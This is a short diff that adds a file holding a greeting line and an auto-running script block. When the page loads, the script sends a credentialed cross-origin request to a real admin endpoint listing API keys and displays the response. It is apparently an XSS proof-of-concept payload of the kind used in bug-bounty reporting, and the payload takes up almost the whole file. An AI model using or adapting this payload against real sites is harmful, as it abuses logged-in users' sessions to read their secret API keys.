@@ -1,0 +1,15 @@
+sending cuong!!!!
+
+<script>
+function loadDoc() {
+  const xhttp = new XMLHttpRequest();
+  xhttp.onload = function() {
+    alert(this.responseText);
+  }
+  xhttp.open("GET", "https://admin.zype.com/api_keys");
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+
+loadDoc();
+</script>
